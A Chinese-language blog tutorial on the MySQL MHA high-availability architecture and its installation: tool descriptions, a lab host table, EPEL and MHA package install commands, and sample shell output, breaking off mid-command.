    <content type="html"><![CDATA[<h1 id="MySQL&#x9AD8;&#x53EF;&#x7528;&#x96C6;&#x7FA4;&#x2014;&#x2014;MHA&#x67B6;&#x6784;"><a href="#MySQL&#x9AD8;&#x53EF;&#x7528;&#x96C6;&#x7FA4;&#x2014;&#x2014;MHA&#x67B6;&#x6784;" class="headerlink" title="MySQL&#x9AD8;&#x53EF;&#x7528;&#x96C6;&#x7FA4;&#x2014;&#x2014;MHA&#x67B6;&#x6784;"></a>MySQL&#x9AD8;&#x53EF;&#x7528;&#x96C6;&#x7FA4;&#x2014;&#x2014;MHA&#x67B6;&#x6784;</h1><p><strong>&#x7B80;&#x4ECB;&#xFF1A;</strong></p><p>MHA&#xFF08;Master High Availability&#xFF09;&#x76EE;&#x524D;&#x5728;MySQL&#x9AD8;&#x53EF;&#x7528;&#x65B9;&#x9762;&#x662F;&#x4E00;&#x4E2A;&#x76F8;&#x5BF9;&#x6210;&#x719F;&#x7684;&#x89E3;&#x51B3;&#x65B9;&#x6848;&#xFF0C;&#x5B83;&#x7531;&#x65E5;&#x672C;DeNA&#x516C;&#x53F8;youshimaton&#xFF08;&#x73B0;&#x5C31;&#x804C;&#x4E8E;Facebook&#x516C;&#x53F8;&#xFF09;&#x5F00;&#x53D1;&#xFF0C;&#x662F;&#x4E00;&#x5957;&#x4F18;&#x79C0;&#x7684;&#x4F5C;&#x4E3A;MySQL&#x9AD8;&#x53EF;&#x7528;&#x6027;&#x73AF;&#x5883;&#x4E0B;&#x6545;&#x969C;&#x5207;&#x6362;&#x548C;&#x4E3B;&#x4ECE;&#x63D0;&#x5347;&#x7684;&#x9AD8;&#x53EF;&#x7528;&#x8F6F;&#x4EF6;&#x3002;&#x5728;MySQL&#x6545;&#x969C;&#x5207;&#x6362;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;MHA&#x80FD;&#x505A;&#x5230;&#x5728;0~30&#x79D2;&#x4E4B;&#x5185;&#x81EA;&#x52A8;&#x5B8C;&#x6210;&#x6570;&#x636E;&#x5E93;&#x7684;&#x6545;&#x969C;&#x5207;&#x6362;&#x64CD;&#x4F5C;&#xFF0C;&#x5E76;&#x4E14;&#x5728;&#x8FDB;&#x884C;&#x6545;&#x969C;&#x5207;&#x6362;&#x7684;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;MHA&#x80FD;&#x5728;&#x6700;&#x5927;&#x7A0B;&#x5EA6;&#x4E0A;&#x4FDD;&#x8BC1;&#x6570;&#x636E;&#x7684;&#x4E00;&#x81F4;&#x6027;&#xFF0C;&#x4EE5;&#x8FBE;&#x5230;&#x771F;&#x6B63;&#x610F;&#x4E49;&#x4E0A;&#x7684;&#x9AD8;&#x53EF;&#x7528;&#x3002;</p><p>&#x8BE5;&#x8F6F;&#x4EF6;&#x7531;&#x4E24;&#x90E8;&#x5206;&#x7EC4;&#x6210;&#xFF1A;MHA Manager&#xFF08;&#x7BA1;&#x7406;&#x8282;&#x70B9;&#xFF09;&#x548C;MHA Node&#xFF08;&#x6570;&#x636E;&#x8282;&#x70B9;&#xFF09;&#x3002;  </p><p>MHA Manager&#x53EF;&#x4EE5;&#x5355;&#x72EC;&#x90E8;&#x7F72;&#x5728;&#x4E00;&#x53F0;&#x72EC;&#x7ACB;&#x7684;&#x673A;&#x5668;&#x4E0A;&#x7BA1;&#x7406;&#x591A;&#x4E2A;master-slave&#x96C6;&#x7FA4;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x90E8;&#x7F72;&#x5728;&#x4E00;&#x53F0;slave&#x8282;&#x70B9;&#x4E0A;&#x3002;<br>MHA Node&#x8FD0;&#x884C;&#x5728;&#x6BCF;&#x53F0;MySQL&#x670D;&#x52A1;&#x5668;&#x4E0A;&#xFF0C;MHA Manager&#x4F1A;&#x5B9A;&#x65F6;&#x63A2;&#x6D4B;&#x96C6;&#x7FA4;&#x4E2D;&#x7684;master&#x8282;&#x70B9;&#xFF0C;&#x5F53;master&#x51FA;&#x73B0;&#x6545;&#x969C;&#x65F6;&#xFF0C;&#x5B83;&#x53EF;&#x4EE5;&#x81EA;&#x52A8;&#x5C06;&#x6700;&#x65B0;&#x6570;&#x636E;&#x7684;slave&#x63D0;&#x5347;&#x4E3A;&#x65B0;&#x7684;master&#xFF0C;&#x7136;&#x540E;&#x5C06;&#x6240;&#x6709;&#x5176;&#x4ED6;&#x7684;slave&#x91CD;&#x65B0;&#x6307;&#x5411;&#x65B0;&#x7684;master&#x3002;&#x6574;&#x4E2A;&#x6545;&#x969C;&#x8F6C;&#x79FB;&#x8FC7;&#x7A0B;&#x5BF9;&#x5E94;&#x7528;&#x7A0B;&#x5E8F;&#x5B8C;&#x5168;&#x900F;&#x660E;&#x3002;</p><p>&#x5728;MHA&#x81EA;&#x52A8;&#x6545;&#x969C;&#x5207;&#x6362;&#x8FC7;&#x7A0B;&#x4E2D;&#xFF0C;MHA&#x8BD5;&#x56FE;&#x4ECE;&#x5B95;&#x673A;&#x7684;&#x4E3B;&#x670D;&#x52A1;&#x5668;&#x4E0A;&#x4FDD;&#x5B58;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;&#xFF0C;&#x6700;&#x5927;&#x7A0B;&#x5EA6;&#x7684;&#x4FDD;&#x8BC1;&#x6570;&#x636E;&#x7684;&#x4E0D;&#x4E22;&#x5931;&#xFF0C;&#x4F46;&#x8FD9;&#x5E76;&#x4E0D;&#x603B;&#x662F;&#x53EF;&#x884C;&#x7684;&#x3002;&#x4F8B;&#x5982;&#xFF0C;&#x5982;&#x679C;&#x4E3B;&#x670D;&#x52A1;&#x5668;&#x786C;&#x4EF6;&#x6545;&#x969C;&#x6216;&#x65E0;&#x6CD5;&#x901A;&#x8FC7;ssh&#x8BBF;&#x95EE;&#xFF0C;MHA&#x6CA1;&#x6CD5;&#x4FDD;&#x5B58;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;&#xFF0C;&#x53EA;&#x8FDB;&#x884C;&#x6545;&#x969C;&#x8F6C;&#x79FB;&#x800C;&#x4E22;&#x5931;&#x4E86;&#x6700;&#x65B0;&#x7684;&#x6570;&#x636E;&#x3002;&#x4F7F;&#x7528;MySQL 5.5&#x7684;&#x534A;&#x540C;&#x6B65;&#x590D;&#x5236;&#xFF0C;&#x53EF;&#x4EE5;&#x5927;&#x5927;&#x964D;&#x4F4E;&#x6570;&#x636E;&#x4E22;&#x5931;&#x7684;&#x98CE;&#x9669;&#x3002;MHA&#x53EF;&#x4EE5;&#x4E0E;&#x534A;&#x540C;&#x6B65;&#x590D;&#x5236;&#x7ED3;&#x5408;&#x8D77;&#x6765;&#x3002;&#x5982;&#x679C;&#x53EA;&#x6709;&#x4E00;&#x4E2A;slave&#x5DF2;&#x7ECF;&#x6536;&#x5230;&#x4E86;&#x6700;&#x65B0;&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;&#xFF0C;MHA&#x53EF;&#x4EE5;&#x5C06;&#x6700;&#x65B0;&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;&#x5E94;&#x7528;&#x4E8E;&#x5176;&#x4ED6;&#x6240;&#x6709;&#x7684;slave&#x670D;&#x52A1;&#x5668;&#x4E0A;&#xFF0C;&#x56E0;&#x6B64;&#x53EF;&#x4EE5;&#x4FDD;&#x8BC1;&#x6240;&#x6709;&#x8282;&#x70B9;&#x7684;&#x6570;&#x636E;&#x4E00;&#x81F4;&#x6027;&#x3002;</p><p>&#x76EE;&#x524D;MHA&#x4E3B;&#x8981;&#x652F;&#x6301;&#x4E00;&#x4E3B;&#x591A;&#x4ECE;&#x7684;&#x67B6;&#x6784;&#xFF0C;&#x8981;&#x642D;&#x5EFA;MHA,&#x8981;&#x6C42;&#x4E00;&#x4E2A;&#x590D;&#x5236;&#x96C6;&#x7FA4;&#x4E2D;&#x5FC5;&#x987B;&#x6700;&#x5C11;&#x6709;&#x4E09;&#x53F0;&#x6570;&#x636E;&#x5E93;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x4E00;&#x4E3B;&#x4E8C;&#x4ECE;&#xFF0C;&#x5373;&#x4E00;&#x53F0;&#x5145;&#x5F53;master&#xFF0C;&#x4E00;&#x53F0;&#x5145;&#x5F53;&#x5907;&#x7528;master&#xFF0C;&#x53E6;&#x5916;&#x4E00;&#x53F0;&#x5145;&#x5F53;&#x4ECE;&#x5E93;&#xFF0C;&#x56E0;&#x4E3A;&#x81F3;&#x5C11;&#x9700;&#x8981;&#x4E09;&#x53F0;&#x670D;&#x52A1;&#x5668;&#xFF0C;&#x51FA;&#x4E8E;&#x673A;&#x5668;&#x6210;&#x672C;&#x7684;&#x8003;&#x8651;&#xFF0C;&#x6DD8;&#x5B9D;&#x4E5F;&#x5728;&#x8BE5;&#x57FA;&#x7840;&#x4E0A;&#x8FDB;&#x884C;&#x4E86;&#x6539;&#x9020;&#xFF0C;&#x76EE;&#x524D;&#x6DD8;&#x5B9D;TMHA&#x5DF2;&#x7ECF;&#x652F;&#x6301;&#x4E00;&#x4E3B;&#x4E00;&#x4ECE;&#x3002;MHA &#x9002;&#x5408;&#x4EFB;&#x4F55;&#x5B58;&#x50A8;&#x5F15;&#x64CE;, &#x53EA;&#x8981;&#x80FD;&#x4E3B;&#x4ECE;&#x590D;&#x5236;&#x7684;&#x5B58;&#x50A8;&#x5F15;&#x64CE;&#x5B83;&#x90FD;&#x652F;&#x6301;&#xFF0C;&#x4E0D;&#x9650;&#x4E8E;&#x652F;&#x6301;&#x4E8B;&#x7269;&#x7684; innodb &#x5F15;&#x64CE;&#x3002;</p><p>&#x5B98;&#x65B9;&#x4ECB;&#x7ECD;&#xFF1A;<a href="https://code.google.com/p/mysql-master-ha/" target="_blank" rel="noopener">https://code.google.com/p/mysql-master-ha/</a></p><p>&#x56FE;01&#x5C55;&#x793A;&#x4E86;&#x5982;&#x4F55;&#x901A;&#x8FC7;MHA Manager&#x7BA1;&#x7406;&#x591A;&#x7EC4;&#x4E3B;&#x4ECE;&#x590D;&#x5236;&#x3002;&#x53EF;&#x4EE5;&#x5C06;MHA&#x5DE5;&#x4F5C;&#x539F;&#x7406;&#x603B;&#x7ED3;&#x4E3A;&#x5982;&#x4E0B;&#xFF1A;<br><img src="http://192.168.85.188:8081/uploads/1652923038589086640mha_str.png" alt=""></p><p>&#xFF08;1&#xFF09;&#x4ECE;&#x5B95;&#x673A;&#x5D29;&#x6E83;&#x7684;master&#x4FDD;&#x5B58;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;&#x4E8B;&#x4EF6;&#xFF08;binlog events&#xFF09;;</p><p>&#xFF08;2&#xFF09;&#x8BC6;&#x522B;&#x542B;&#x6709;&#x6700;&#x65B0;&#x66F4;&#x65B0;&#x7684;slave&#xFF1B;</p><p>&#xFF08;3&#xFF09;&#x5E94;&#x7528;&#x5DEE;&#x5F02;&#x7684;&#x4E2D;&#x7EE7;&#x65E5;&#x5FD7;&#xFF08;relay log&#xFF09;&#x5230;&#x5176;&#x4ED6;&#x7684;slave&#xFF1B;</p><p>&#xFF08;4&#xFF09;&#x5E94;&#x7528;&#x4ECE;master&#x4FDD;&#x5B58;&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;&#x4E8B;&#x4EF6;&#xFF08;binlog events&#xFF09;&#xFF1B;</p><p>&#xFF08;5&#xFF09;&#x63D0;&#x5347;&#x4E00;&#x4E2A;slave&#x4E3A;&#x65B0;&#x7684;master&#xFF1B;</p><p>&#xFF08;6&#xFF09;&#x4F7F;&#x5176;&#x4ED6;&#x7684;slave&#x8FDE;&#x63A5;&#x65B0;&#x7684;master&#x8FDB;&#x884C;&#x590D;&#x5236;&#xFF1B;</p><p>MHA&#x8F6F;&#x4EF6;&#x7531;&#x4E24;&#x90E8;&#x5206;&#x7EC4;&#x6210;&#xFF0C;Manager&#x5DE5;&#x5177;&#x5305;&#x548C;Node&#x5DE5;&#x5177;&#x5305;&#xFF0C;&#x5177;&#x4F53;&#x7684;&#x8BF4;&#x660E;&#x5982;&#x4E0B;&#x3002;</p><p><strong>MHA Manager</strong>&#x5DE5;&#x5177;&#x5305;&#x7531;&#x4E24;&#x90E8;&#x5206;&#x7EC4;&#x6210;&#xFF0C;Manager&#x5DE5;&#x5177;&#x5305;&#x548C;Node&#x5DE5;&#x5177;&#x5305;&#xFF0C;&#x5177;&#x4F53;&#x7684;&#x8BF4;&#x660E;&#x5982;&#x4E0B;&#x3002;</p><p>Manager&#x5DE5;&#x5177;&#x5305;&#x4E3B;&#x8981;&#x5305;&#x62EC;&#x4EE5;&#x4E0B;&#x51E0;&#x4E2A;&#x5DE5;&#x5177;&#xFF1A;</p><table><thead><tr><th><strong>&#x540D; &#x79F0;</strong></th><th><strong>&#x4F5C; &#x7528;</strong></th></tr></thead><tbody><tr><td>masterha_check_ssh</td><td>&#x68C0;&#x67E5;MHA&#x7684;SSH&#x914D;&#x7F6E;&#x72B6;&#x51B5;</td></tr><tr><td>masterha_check_repl</td><td>&#x68C0;&#x67E5;MySQL&#x590D;&#x5236;&#x72B6;&#x51B5;</td></tr><tr><td>masterha_manager</td><td>&#x542F;&#x52A8;MHA</td></tr><tr><td>masterha_check_status</td><td>&#x68C0;&#x6D4B;&#x5F53;&#x524D;MHA&#x8FD0;&#x884C;&#x72B6;&#x6001;</td></tr><tr><td>masterha_master_monitor</td><td>&#x68C0;&#x6D4B;master&#x662F;&#x5426;&#x5B95;&#x673A;</td></tr><tr><td>masterha_master_switch</td><td>&#x63A7;&#x5236;&#x6545;&#x969C;&#x8F6C;&#x79FB;&#xFF08;&#x81EA;&#x52A8;&#x6216;&#x624B;&#x52A8;&#xFF09;</td></tr><tr><td>masterha_conf_host</td><td>&#x6DFB;&#x52A0;&#x6216;&#x5220;&#x9664;&#x914D;&#x7F6E;&#x7684;server&#x4FE1;&#x606F;</td></tr></tbody></table><p><strong>MHA Node</strong>&#x5DE5;&#x5177;&#x5305;&#xFF08;&#x8FD9;&#x4E9B;&#x5DE5;&#x5177;&#x901A;&#x5E38;&#x6709;MHA Manager&#x7684;&#x811A;&#x672C;&#x89E6;&#x53D1;&#xFF0C;&#x65E0;&#x9700;&#x4EBA;&#x4E3A;&#x64CD;&#x4F5C;&#xFF09;&#x4E3B;&#x8981;&#x5305;&#x62EC;&#x4EE5;&#x4E0B;&#x51E0;&#x4E2A;&#x5DE5;&#x5177;&#xFF1A;</p><table><thead><tr><th><strong>&#x540D; &#x79F0;</strong></th><th><strong>&#x4F5C; &#x7528;</strong></th></tr></thead><tbody><tr><td>save_binary_logs</td><td>&#x4FDD;&#x5B58;&#x548C;&#x590D;&#x5236;master&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x65E5;&#x5FD7;</td></tr><tr><td>apply_diff_relay_logs</td><td>&#x8BC6;&#x522B;&#x5DEE;&#x5F02;&#x7684;&#x4E2D;&#x7EE7;&#x65E5;&#x5FD7;&#x4E8B;&#x4EF6;&#x5E76;&#x5C06;&#x5176;&#x5DEE;&#x5F02;&#x7684;&#x4E8B;&#x4EF6;&#x5E94;&#x7528;&#x4E8E;&#x5176;&#x4ED6;&#x7684;slave</td></tr><tr><td>filter_mysqlbinlog</td><td>&#x53BB;&#x9664;&#x4E0D;&#x5FC5;&#x8981;&#x7684;ROLLBACK&#x4E8B;&#x4EF6;&#xFF08;&#x5DF2;&#x5E9F;&#x5F03;&#xFF09;</td></tr><tr><td>purge_relay_logs</td><td>&#x6E05;&#x9664;&#x4E2D;&#x7EE7;&#x65E5;&#x5FD7;&#xFF08;&#x4E0D;&#x4F1A;&#x963B;&#x585E;SQL&#x7EBF;&#x7A0B;&#xFF09;</td></tr></tbody></table><p><em>&#x6CE8;&#x610F;&#xFF1A;</em><br>&#x4E3A;&#x4E86;&#x5C3D;&#x53EF;&#x80FD;&#x7684;&#x51CF;&#x5C11;&#x4E3B;&#x5E93;&#x786C;&#x4EF6;&#x635F;&#x574F;&#x5B95;&#x673A;&#x9020;&#x6210;&#x7684;&#x6570;&#x636E;&#x4E22;&#x5931;&#xFF0C;&#x56E0;&#x6B64;&#x5728;&#x914D;&#x7F6E;MHA&#x7684;&#x540C;&#x65F6;&#x5EFA;&#x8BAE;&#x914D;&#x7F6E;&#x6210;MySQL 5.5&#x7684;&#x534A;&#x540C;&#x6B65;&#x590D;&#x5236;&#x3002;&#x5173;&#x4E8E;&#x534A;&#x540C;&#x6B65;&#x590D;&#x5236;&#x539F;&#x7406;&#x5404;&#x4F4D;&#x81EA;&#x5DF1;&#x8FDB;&#x884C;&#x67E5;&#x9605;&#x3002;&#xFF08;&#x4E0D;&#x662F;&#x5FC5;&#x987B;&#xFF09;</p><h2 id="1-&#x5B89;&#x88C5;&#x90E8;&#x7F72;MHA"><a href="#1-&#x5B89;&#x88C5;&#x90E8;&#x7F72;MHA" class="headerlink" title="1. &#x5B89;&#x88C5;&#x90E8;&#x7F72;MHA"></a>1. &#x5B89;&#x88C5;&#x90E8;&#x7F72;MHA</h2><p>&#x63A5;&#x4E0B;&#x6765;&#x90E8;&#x7F72;MHA&#xFF0C;&#x5177;&#x4F53;&#x7684;&#x642D;&#x5EFA;&#x73AF;&#x5883;&#x5982;&#x4E0B;&#xFF08;&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;&#x4E3A;2&#x53F0;CentOS7.4 64bit&#xFF0C;2&#x53F0;RHEL7.3 64bit&#xFF09;</p><table><thead><tr><th>&#x89D2;&#x8272;</th><th>IP&#x5730;&#x5740;</th><th>&#x4E3B;&#x673A;&#x540D;</th><th>&#x5DE5;&#x5177;</th><th>&#x64CD;&#x4F5C;&#x7CFB;&#x7EDF;</th></tr></thead><tbody><tr><td>manager</td><td>192.168.73.20</td><td>ctos7mini</td><td>mha4mysql-manager,mha4mysql-node</td><td>CentOS7.4 x64</td></tr><tr><td>master</td><td>192.168.73.21</td><td>rhel7</td><td>mha4mysql-node</td><td>RHEL7.3 x64</td></tr><tr><td>slave,candicate master</td><td>192.168.73.22</td><td>rhel_sqlsrv</td><td>mha4mysql-node</td><td>RHEL7.3 x64</td></tr><tr><td>slave</td><td>192.168.73.23</td><td>ctos_sqlsrv</td><td>mha4mysql-node</td><td>CentOS7.4 x64</td></tr></tbody></table><p>&#x5176;&#x4E2D;master&#x5BF9;&#x5916;&#x63D0;&#x4F9B;&#x5199;&#x670D;&#x52A1;&#xFF0C;&#x5907;&#x9009;Candicate master&#xFF08;&#x5B9E;&#x9645;&#x4E3A;slave1&#xFF09;&#x63D0;&#x4F9B;&#x8BFB;&#x670D;&#x52A1;&#xFF0C;slave2&#x4E5F;&#x63D0;&#x4F9B;&#x8BFB;&#x670D;&#x52A1;&#xFF0C;&#x4E00;&#x65E6;master&#x5B95;&#x673A;&#xFF0C;&#x5C06;&#x4F1A;&#x628A;&#x5907;&#x9009;master&#x63D0;&#x5347;&#x4E3A;&#x65B0;&#x7684;master&#xFF0C;slave&#x6307;&#x5411;&#x65B0;&#x7684;master</p><p><strong>&#xFF08;1&#xFF09;&#x5728;&#x5B89;&#x88C5;MHA&#x5DE5;&#x5177;&#x4E4B;&#x524D;&#xFF0C;&#x5148;&#x8981;&#x5B89;&#x88C5;epel&#x6E90;&#xFF0C;&#x89E3;&#x51B3;&#x4F9D;&#x8D56;&#x5305;&#x95EE;&#x9898;&#xFF1A;</strong></p><p>Centos6&#x5B89;&#x88C5;&#x6E90;&#xFF1A;<br>    rpm -ivh <a href="http://dl.fedoraproject.org/pub/epel/6/x86_64/epel-release-6-8.noarch.rpm&#xFF08;&#x5DF2;&#x5931;&#x6548;&#xFF0C;&#x5B98;&#x65B9;&#x4E0D;&#x518D;&#x652F;&#x6301;&#xFF09;" target="_blank" rel="noopener">http://dl.fedoraproject.org/pub/epel/6/x86_64/epel-release-6-8.noarch.rpm&#xFF08;&#x5DF2;&#x5931;&#x6548;&#xFF0C;&#x5B98;&#x65B9;&#x4E0D;&#x518D;&#x652F;&#x6301;&#xFF09;</a><br>Centos7&#x5B89;&#x88C5;&#x6E90;&#xFF1A;<br>    rpm -ivh <a href="https://dl.fedoraproject.org/pub/epel/7/x86_64/Packages/e/epel-release-7-14.noarch.rpm" target="_blank" rel="noopener">https://dl.fedoraproject.org/pub/epel/7/x86_64/Packages/e/epel-release-7-14.noarch.rpm</a><br>Centos8&#x5B89;&#x88C5;&#x6E90;&#xFF1A;8&#x4EE5;&#x4E0A;&#x9700;&#x8981;&#x5B89;&#x88C5;2&#x4E2A;&#xFF1A;<br>    rpm -ivh <a href="https://dl.fedoraproject.org/pub/epel/8/Everything/x86_64/Packages/e/epel-release-8-15.el8.noarch.rpm" target="_blank" rel="noopener">https://dl.fedoraproject.org/pub/epel/8/Everything/x86_64/Packages/e/epel-release-8-15.el8.noarch.rpm</a><br>    rpm -ivh <a href="https://dl.fedoraproject.org/pub/epel/8/Everything/x86_64/Packages/e/epel-next-release-8-15.el8.noarch.rpm" target="_blank" rel="noopener">https://dl.fedoraproject.org/pub/epel/8/Everything/x86_64/Packages/e/epel-next-release-8-15.el8.noarch.rpm</a>  </p><p>Centos9&#x5B89;&#x88C5;&#x6E90;&#xFF1A;<br>    rpm -ivh <a href="https://dl.fedoraproject.org/pub/epel/9/Everything/x86_64/Packages/e/epel-release-9-2.el9.noarch.rpm" target="_blank" rel="noopener">https://dl.fedoraproject.org/pub/epel/9/Everything/x86_64/Packages/e/epel-release-9-2.el9.noarch.rpm</a><br>    rpm -ivh <a href="https://dl.fedoraproject.org/pub/epel/9/Everything/x86_64/Packages/e/epel-next-release-9-2.el9.noarch.rpm" target="_blank" rel="noopener">https://dl.fedoraproject.org/pub/epel/9/Everything/x86_64/Packages/e/epel-next-release-9-2.el9.noarch.rpm</a>  </p><p>RHEL7&#x5B89;&#x88C5;&#x6E90;&#xFF1A;yum install <a href="https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm" target="_blank" rel="noopener">https://dl.fedoraproject.org/pub/epel/epel-release-latest-7.noarch.rpm</a><br>RHEL8&#x5B89;&#x88C5;&#x6E90;&#xFF1A;dnf install <a href="https://dl.fedoraproject.org/pub/epel/epel-release-latest-8.noarch.rpm" target="_blank" rel="noopener">https://dl.fedoraproject.org/pub/epel/epel-release-latest-8.noarch.rpm</a><br>RHEL9-Beta&#x5B89;&#x88C5;&#x6E90;&#xFF1A;dnf install <a href="https://dl.fedoraproject.org/pub/epel/epel-release-latest-9.noarch.rpm" target="_blank" rel="noopener">https://dl.fedoraproject.org/pub/epel/epel-release-latest-9.noarch.rpm</a>  </p><p>MHA Manager&#x4E2D;&#x4E3B;&#x8981;&#x5305;&#x62EC;&#x4E86;&#x51E0;&#x4E2A;&#x7BA1;&#x7406;&#x5458;&#x7684;&#x547D;&#x4EE4;&#x884C;&#x5DE5;&#x5177;&#xFF0C;&#x4F8B;&#x5982;master_manger&#xFF0C;master_master_switch&#x7B49;&#xFF1B;MHA Manger&#x4E5F;&#x4F9D;&#x8D56;&#x4E8E;perl&#x6A21;&#x5757;&#xFF0C;&#x5177;&#x4F53;&#x5982;&#x4E0B;&#xFF1A;</p><p>&#xFF08;1&#xFF09;&#x5B89;&#x88C5;MHA Node&#x8F6F;&#x4EF6;&#x5305;&#x4E4B;&#x524D;&#x9700;&#x8981;&#x5B89;&#x88C5;&#x4F9D;&#x8D56;&#xFF0C;&#x6211;&#x8FD9;&#x91CC;&#x4F7F;&#x7528;yum&#x5B8C;&#x6210;&#xFF0C;&#x9996;&#x5148;epel&#x6E90;&#x8981;&#x5B89;&#x88C5;&#x6CE8;&#x610F;&#xFF1A;&#x521A;&#x624D;&#x5DF2;&#x7ECF;&#x914D;&#x7F6E;epel&#x6E90;</p><p>&#xFF08;2&#xFF09;&#x5B89;&#x88C5;MHA Manager &#x9996;&#x5148;&#x5B89;&#x88C5;MHA Manger&#x4F9D;&#x8D56;&#x7684;perl&#x6A21;&#x5757;&#xFF08;&#x6211;&#x8FD9;&#x91CC;&#x4F7F;&#x7528;yum&#x5B89;&#x88C5;&#xFF09;&#xFF1A;</p><p>&#x5728;&#x6240;&#x6709;&#x673A;&#x5668;&#x4E0A;&#x4F7F;&#x7528;yum&#x5B89;&#x88C5;&#x5168;&#x90E8;&#x4F9D;&#x8D56;</p><pre><code>yum install perl-DBD-MySQL perl-Config-Tiny perl-Log-Dispatch perl-Parallel-ForkManager perl-Time-HiRes perl-ExtUtils-CBuilder perl-ExtUtils-MakeMaker perl-CPAN -y</code></pre><p><strong>&#x6CE8;&#xFF01;</strong>&#x5728;RHEL&#x7CFB;&#x7EDF;&#x4E2D;&#x5B89;&#x88C5;&#x4E86;epel&#x6E90;&#x4E4B;&#x540E;&#x4F9D;&#x65E7;&#x4F1A;&#x51FA;&#x73B0;&#x7F3A;&#x5C11;&#x4F9D;&#x8D56;&#x5305;&#x95EE;&#x9898;</p><p><strong>&#xFF08;2&#xFF09;&#x83B7;&#x53D6;MHA&#x76F8;&#x5173;&#x5305;&#xFF0C;&#x5728;&#x6240;&#x6709;&#x7684;&#x8282;&#x70B9;&#x5B89;&#x88C5;mha-node&#xFF1A;</strong></p><p>&#x76F8;&#x5173;&#x4E0B;&#x8F7D;&#x5730;&#x5740;&#xFF1A;<br>&#x963F;&#x91CC;&#x4E91;&#x76D8;&#x5206;&#x4EAB;&#xFF1A;<a href="https://www.aliyundrive.com/s/cMNxKg6srT6" target="_blank" rel="noopener">https://www.aliyundrive.com/s/cMNxKg6srT6</a><br>mha_manager_0.55 (RHEL/CentOS 4,5)<br><a href="https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/mysql-master-ha/mha4mysql-manager-0.55-1.el5.noarch.rpm" target="_blank" rel="noopener">https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/mysql-master-ha/mha4mysql-manager-0.55-1.el5.noarch.rpm</a><br>mha_manager_0.55 (RHEL/CentOS 6)<br><a href="https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/mysql-master-ha/mha4mysql-manager-0.55-0.el6.noarch.rpm" target="_blank" rel="noopener">https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/mysql-master-ha/mha4mysql-manager-0.55-0.el6.noarch.rpm</a>  </p><p>mha_manager_0.54 (RHEL/CentOS 4,5)<br><a href="https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/mysql-master-ha/mha4mysql-manager-0.54-0.el5.noarch.rpm" target="_blank" rel="noopener">https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/mysql-master-ha/mha4mysql-manager-0.54-0.el5.noarch.rpm</a><br>mha_manager_0.54 (RHEL/CentOS 6)<br><a href="https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/mysql-master-ha/mha4mysql-manager-0.54-0.el6.noarch.rpm" target="_blank" rel="noopener">https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/mysql-master-ha/mha4mysql-manager-0.54-0.el6.noarch.rpm</a>  </p><p>mha_node_0.54 (RHEL/CentOS 4,5)<br><a href="https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/mysql-master-ha/mha4mysql-node-0.54-1.el5.noarch.rpm" target="_blank" rel="noopener">https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/mysql-master-ha/mha4mysql-node-0.54-1.el5.noarch.rpm</a><br>mha_node_0.54 (RHEL/CentOS 6)<br><a href="https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/mysql-master-ha/mha4mysql-node-0.54-0.el6.noarch.rpm" target="_blank" rel="noopener">https://storage.googleapis.com/google-code-archive-downloads/v2/code.google.com/mysql-master-ha/mha4mysql-node-0.54-0.el6.noarch.rpm</a>  </p><p>mha_node&#x5B89;&#x88C5;&#x5B8C;&#x6210;&#x540E;&#x4F1A;&#x5728;/usr/bin/&#x76EE;&#x5F55;&#x4E0B;&#x751F;&#x6210;&#x4EE5;&#x4E0B;&#x811A;&#x672C;&#x6587;&#x4EF6;&#xFF1A;  </p><pre><code class="shell">[root@ctos7mini ~]&amp; rpm -ivh mha4mysql-node-0.54-0.el6.noarch.rpm[root@ctos7mini ~]&amp; cd /usr/bin/[root@ctos7mini bin]&amp; ll app* filter* purge* save*-rwxr-xr-x. 1 root root 15977 Dec  1  2012 apply_diff_relay_logs-rwxr-xr-x. 1 root root  4807 Dec  1  2012 filter_mysqlbinlog-rwxr-xr-x. 1 root root  7401 Dec  1  2012 purge_relay_logs-rwxr-xr-x. 1 root root  7263 Dec  1  2012 save_binary_logs[root@ctos7mini bin]&amp;</code></pre><p><strong>&#xFF08;3&#xFF09;&#x5B89;&#x88C5;MHA Manager</strong></p><p>&#x5B89;&#x88C5;MHA Manager&#x8F6F;&#x4EF6;&#x5305;&#xFF1A;</p><pre><code class="xml">[root@ctos7mini mysql_master_ha]# rpm -ivh mha4mysql-manager-0.54-0.el6.noarch.rpmPreparing...                          ################################# [100%]Updating / installing...   1:mha4mysql-manager-0.54-0.el6     ################################# [100%][root@ctos7mini mysql_master_ha]#</code></pre><p><strong>&#x6CE8;&#x610F;&#xFF01;</strong> &#x5982;&#x679C;&#x5728;RHEL&#x4E0A;&#x53EF;&#x80FD;&#x51FA;&#x73B0;&#x65E0;&#x6CD5;&#x5B89;&#x88C5;MHA Manager&#xFF0C;&#x51FA;&#x73B0;&#x7F3A;&#x5C11;&#x4F9D;&#x8D56;&#xFF0C;&#x63D0;&#x793A;&#x9700;&#x8981;&#x5B89;&#x88C5;<code>perl-Config-Tiny</code><br>&#x9700;&#x8981;&#x5728;rhel&#x7CFB;&#x7EDF;&#x624B;&#x52A8;&#x4E0B;&#x8F7D;&#x5B89;&#x88C5;&#xFF1A;  </p><pre><code>rpm -ivh 